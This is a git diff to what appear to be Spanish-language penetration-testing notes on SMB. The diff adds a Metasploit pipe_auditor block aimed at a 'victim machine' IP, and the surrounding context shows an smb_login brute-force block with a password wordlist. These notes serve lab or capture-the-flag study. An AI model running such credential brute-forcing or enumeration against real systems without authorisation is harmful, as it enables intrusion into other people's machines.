@@ -184,7 +184,7 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 ```
 
 ```bash 
-# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
+	# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
 ❯ msfconsole -q                                               # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
@@ -199,6 +199,18 @@ Staged                  # Sends payload in stages. Can be less stable -> **windo
 
 # Diccionarios 
 /usr/share/wordlists/metasploit/unix_passwords.txt
+```
+
+```bash 
+# Para enumerar los nombres de los 'pipes' que existen en el SMB
+❯ msfconsole -q                                    # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/pipe_auditor      # Usamos el auxiliar
+	❯ options
+	❯ set smbuser <admin>
+	❯ set smbpass <passwd>
+	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
+	❯ run 
 ```
 
 ## Puerto 445 'Exploit'
